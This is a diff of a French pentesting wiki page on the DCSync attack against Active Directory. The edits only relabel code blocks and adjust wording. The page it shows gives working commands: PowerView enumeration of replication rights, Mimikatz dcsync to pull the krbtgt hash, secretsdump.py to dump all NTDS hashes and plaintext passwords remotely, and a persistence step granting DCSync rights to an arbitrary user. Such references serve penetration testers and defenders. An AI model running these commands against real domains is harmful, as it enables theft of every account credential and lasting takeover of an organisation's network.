@@ -10,20 +10,20 @@ La permission **DCSync** implique d'avoir ces permissions sur le domaine lui-mê
 
 - L'**attaque DCSync simule le comportement d'un contrôleur de domaine et demande à d'autres contrôleurs de domaine de répliquer des informations** en utilisant le protocole de service de réplication de répertoire à distance (MS-DRSR). Étant donné que MS-DRSR est une fonction valide et nécessaire d'Active Directory, il ne peut pas être désactivé.
 - Par défaut, seuls les groupes **Domain Admins, Enterprise Admins, Administrators et Domain Controllers** ont les privilèges requis.
-- Si des mots de passe de compte sont stockés avec un chiffrement réversible, une option est disponible dans Mimikatz pour retourner le mot de passe en texte clair.
+- Si des mots de passe de comptes sont stockés avec un chiffrement réversible, une option est disponible dans Mimikatz pour retourner le mot de passe en texte clair.
 
 ### Enumeration
 
 Vérifiez qui a ces permissions en utilisant `powerview` :
-```powershell
+```bash
 Get-ObjectAcl -DistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -ResolveGUIDs | ?{($_.ObjectType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll') -or ($_.ActiveDirectoryRights -match 'WriteDacl')}
 ```
 ### Exploiter localement
-```powershell
+```bash
 Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'
 ```
 ### Exploiter à distance
-```powershell
+```bash
 secretsdump.py -just-dc <user>:<password>@<ipaddress> -outputfile dcsync_hashes
 [-just-dc-user <USERNAME>] #To get only of that user
 [-pwd-last-set] #To see when each account's password was last changed
@@ -33,20 +33,20 @@ secretsdump.py -just-dc <user>:<password>@<ipaddress> -outputfile dcsync_hashes
 
 - un avec les **hashes NTLM**
 - un avec les **clés Kerberos**
-- un avec les mots de passe en clair de l'NTDS pour tous les comptes configurés avec [**le chiffrement réversible**](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/store-passwords-using-reversible-encryption) activé. Vous pouvez obtenir les utilisateurs avec le chiffrement réversible avec
+- un avec les mots de passe en clair de l'NTDS pour tous les comptes configurés avec [**chiffrement réversible**](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/store-passwords-using-reversible-encryption) activé. Vous pouvez obtenir les utilisateurs avec chiffrement réversible avec
 
-```powershell
+```bash
 Get-DomainUser -Identity * | ? {$_.useraccountcontrol -like '*ENCRYPTED_TEXT_PWD_ALLOWED*'} |select samaccountname,useraccountcontrol
 ```
 
 ### Persistance
 
 Si vous êtes un administrateur de domaine, vous pouvez accorder ces permissions à n'importe quel utilisateur avec l'aide de `powerview` :
-```powershell
+```bash
 Add-ObjectAcl -TargetDistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -PrincipalSamAccountName username -Rights DCSync -Verbose
 ```
 Ensuite, vous pouvez **vérifier si l'utilisateur a été correctement assigné** les 3 privilèges en les recherchant dans la sortie de (vous devriez pouvoir voir les noms des privilèges dans le champ "ObjectType") :
-```powershell
+```bash
 Get-ObjectAcl -DistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -ResolveGUIDs | ?{$_.IdentityReference -match "student114"}
 ```
 ### Atténuation
